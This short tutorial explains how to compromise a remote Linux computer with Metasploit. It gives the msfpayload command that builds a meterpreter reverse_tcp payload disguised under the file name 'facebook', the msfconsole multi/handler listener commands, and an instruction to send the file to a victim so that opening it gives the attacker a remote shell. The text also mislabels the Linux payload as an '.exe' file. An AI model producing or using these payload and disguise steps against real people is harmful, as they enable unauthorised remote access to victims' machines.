Hack Remote Linux PC using msfpayload in BackTrack

msfpayload is a command-line instance of Metasploit that is used to generate and output all of the various types of shellcode that are available in Metasploit. The most common use of this tool is for the generation of shellcode for an exploit that is not currently in the Metasploit Framework or for testing different types of shellcode and options before finalizing a module.
msfpayload linux/x86/meterpreter/reverse_tcp lhost= 192.168.1.6 lport= 4444 x > /root/Desktop/facebook
  
Now we successfully generate the malicious exe File, it will stored on your local computer
/root/Desktop/facebook
Now open your backtrack terminal and type msfconsole

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost 192.168.1.6
set lport 4444
exploit
Now send your facebook.exe files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
